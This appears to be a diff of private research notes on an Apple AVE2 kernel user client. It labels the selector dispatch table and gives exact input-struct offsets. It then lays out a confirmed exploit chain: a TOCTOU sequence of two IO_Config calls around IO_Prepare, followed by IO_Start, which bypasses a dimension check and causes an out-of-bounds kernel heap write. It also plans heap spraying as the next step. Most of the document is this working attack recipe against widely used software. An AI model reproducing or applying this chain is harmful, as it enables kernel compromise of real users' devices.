@@ -31,21 +31,21 @@
 **Dispatch table VA**: `0xfffffff007dc1840` (in `__DATA_CONST.__const`)  
 **Table format**: `IOExternalMethodDispatch` — 24 bytes/entry: `[action:8][scalar_in:4][struct_in:4][scalar_out:4][struct_out:4]`
 
-| Sel | Action VA              | struct_in   | struct_out  | Notes                        |
+| Sel | Action VA              | struct_in   | struct_out  | Function / Notes             |
 |-----|------------------------|-------------|-------------|------------------------------|
-|  0  | 0xfffffff0086401ec     | 0x38        | 0x20        |                              |
-|  1  | 0xfffffff008640aa8     | 0x1a0a0     | 0x20        | Large config struct (Configure?) |
-|  2  | 0xfffffff00864157c     | 0x1a0b0     | 0x150       | "pIn->iUCInfoIdx >= 0" assertion |
-|  3  | 0xfffffff008642094     | 0x30        | 0x20        |                              |
-|  4  | 0xfffffff0086428ac     | 0x30        | 0x20        |                              |
-|  5  | 0xfffffff0086430c4     | 0x30        | 0x20        |                              |
-|  6  | 0xfffffff0086438dc     | 0x30        | 0x20        |                              |
-|  7  | 0xfffffff0086440f4     | 0x30        | 0x20        |                              |
-|  8  | 0xfffffff00864490c     | 0           | 0           | "Config" / "AppleAVE2UserClient" |
-|  9  | 0xfffffff008644dd4     | 0           | 0           | **Prepare** — `S_AVE_UCInParam_Prepare` assertion |
-| 10  | 0xfffffff00864526c     | 0           | 0           |                              |
-| 11  | 0xfffffff008645708     | 0           | 0           |                              |
-| 12  | 0xfffffff008645ba4     | 0           | 0           |                              |
+|  0  | 0xfffffff0086401ec     | 0x38        | 0x20        | **IO_Open** — open encode session |
+|  1  | 0xfffffff008640aa8     | 0x1a0a0     | 0x20        | **IO_Close** — close session |
+|  2  | 0xfffffff00864157c     | 0x1a0b0     | 0x150       | **IO_Config** — `sub_8644574` (outer), `sub_8640d9c` (CheckParam) · "AVE_UCCmd_CheckParam_Config" |
+|  3  | 0xfffffff008642094     | 0x30        | 0x20        | **IO_Prepare** — allocates kernel buffers; sets encoder_state[0x1838/183c] = w/h |
+|  4  | 0xfffffff0086428ac     | 0x30        | 0x20        | **IO_Start** — PATH B (VULNERABLE) → sub_8645b88 → sub_85249dc → sub_851ea24 → CheckGGMInfo bypass |
+|  5  | 0xfffffff0086430c4     | 0x30        | 0x20        | IO_Stop  |
+|  6  | 0xfffffff0086438dc     | 0x30        | 0x20        | IO_Process |
+|  7  | 0xfffffff0086440f4     | 0x30        | 0x20        | IO_Complete |
+|  8  | 0xfffffff00864490c     | 0           | 0           | IO_Flush |
+|  9  | 0xfffffff008644dd4     | 0           | 0           | IO_Reset |
+| 10  | 0xfffffff00864526c     | 0           | 0           | IO_Print |
+| 11  | 0xfffffff008645708     | 0           | 0           | IO_PowerOn |
+| 12  | 0xfffffff008645ba4     | 0           | 0           | IO_PowerOff |
 
 ### Key notes
 
@@ -241,31 +241,60 @@ Note: in 26.7.2, x21 = arg3 = Config struct (arg assignments changed between ver
 
 ---
 
-### Exploit chain (CVE-2026-112689):
+### Config struct layout (confirmed 2026-11-04)
+
+The config struct (arg3 `x22` in `AVE_Client_CheckGGMInfo`) is located at:
+```
+session_obj + 0x340
+```
+Confirmed by: `add x5, x20, #0x340` at 0xfffffff008645fdc (call site inside `sub_8645b88`).
+x5 = arg5 to `sub_85249dc` → saved as x27 → passed as x2 to `sub_851ea24` → x22 in `sub_851e204` → arg3 to `CheckGGMInfo`.
+
+**IO_Config input struct mapping (1:1 to config struct offsets):**
+- `input[0x0028]` = `iNotificationFunc` — must be non-null (CheckParam_Config)
+- `input[0x0030]` = `iNotificationParam` — must be non-null
+- `input[0x01c8]` = `iLAFrameCnt` — set >20 to reach PATH B via look-ahead encode path
+- `input[0x0248]` = `iNumOfFrame_B` — alternative PATH B trigger (set >3)
+- `input[0x0a58]` = `ui32Width` — frame width for START
+- `input[0x0a5c]` = `ui32Height` — frame height for START
+- `input[0x2ec0]` = `mode_flag` — **set to 0 to activate bypass** (any value ≠ 1)
+
+**IO_Config handler:** `sub_8644574` (outer wrapper, references "AppleAVE2UserClient"/"Config")  
+calls → `sub_8640d9c` (CheckParam_Config, validates iNotificationFunc etc.)  
+then → stores fields to session_obj from x20 at [+0x100,0x108,0x110...].
+
+---
+
+### Exploit chain (CVE-2026-112689) — CONFIRMED:
 
 ```
-1. Sel 0 (init): HEVC codec (eEncType=4)
-2. Sel 1 (config): width=64, height=64, iLAFrameCnt=21, mode_flag=0 (at Config[0x2ec0])
-3. Sel 9 (prepare): allocates small buffer; sets encoder_state[0x1838/0x183c] = 64/64
-4. Sel 1 (reconfig): width=4096, height=4096, same iLAFrameCnt=21, mode_flag=0
-5. START selector (10 or 11): calls AVE_Client_CheckGGMInfo via PATH B
-   → HEVC dimension validator passes (4096×4096 is valid HEVC)
-   → cbz w0 → reaches bypass site
-   → mode_flag=0 ≠ 1 → BYPASS ACTIVATED → mismatch check SKIPPED
-   → Codec processes 4096×4096 frame into 64×64 buffer → OOB write
+sel=0  IO_Open(0x38 input):    Open HEVC encode session
+sel=2  IO_Config(0x1a0b0 input):
+         width=64, height=64, iLAFrameCnt=21, mode_flag=0
+         → config[0x2ec0]=0 (bypass armed), config[0xa58]=64, config[0x1c8]=21
+sel=3  IO_Prepare(0x30 input):  Allocates kernel buffer for 64×64
+         → encoder_state[0x1838]=64, encoder_state[0x183c]=64
+sel=2  IO_Config(0x1a0b0 input): TOCTOU trigger
+         width=4096, height=4096, iLAFrameCnt=21, mode_flag=0
+         → config[0xa58]=4096 (now mismatches prepared 64)
+sel=4  IO_Start(0x30 input):   PATH B (iLAFrameCnt=21 → look-ahead path)
+         → sub_8645b88 → sub_85249dc → sub_851ea24 → sub_851e204
+         → AVE_Client_CheckGGMInfo (0x851dd2c)
+         → tbnz bypass: bit0(arg2)=0 → continue to mode_flag check
+         → ldr w8, [x22, #0x2ec0] = 0
+         → cmp w8, #1 → b.ne: mode_flag=0 ≠ 1 → BYPASS ACTIVATED
+         → mismatch check SKIPPED (encoder_state[0x1838]=64 ≠ config[0xa58]=4096)
+         → Encode processes 4096×4096 frame into 64×64 kalloc buffer → OOB WRITE
 ```
 
-**Key input struct fields for the bypass:**
-- `Config[0xa58]` = ui32Width (start dimensions)
-- `Config[0xa5c]` = ui32Height
-- `Config[0x2ec0]` = mode_flag — set to 0 to activate bypass
-- `Config[0x1c8]`  = iLAFrameCnt — set to 21 to reach bypass via secondary PATH B
+**PoC script**: `kerneldiff/ave2_poc.py` (ResearchHost job — close PocketCode before running)
 
 ---
 
 ## Notes / Open Questions
 
-- Which exact selector (10, 11, or 12) calls `AVE_Client_CheckGGMInfo` via PATH B?
-- What is PATH B exactly? (the code path that bypasses the 0x851d614 iLAFrameCnt check on the PREPARE path)
-- Does calling Sel 1 twice (after Prepare) trigger PATH B?
-- Confirm the PoC selector sequence before running on device
+- **ANSWERED**: Sel 4 = IO_Start (confirmed by Mac session, PATH B confirmed)
+- **ANSWERED**: PATH B = IO_Start → sub_8645b88 → sub_85249dc → sub_851ea24 (bypasses sub_8523fb0)
+- **ANSWERED**: Two IO_Config calls (small then large) trigger the TOCTOU
+- Panic log from first PoC run will reveal: kalloc zone, adjacent object type, fault PC
+- After confirming OOB: heap spray the adjacent kalloc zone to target a specific object type
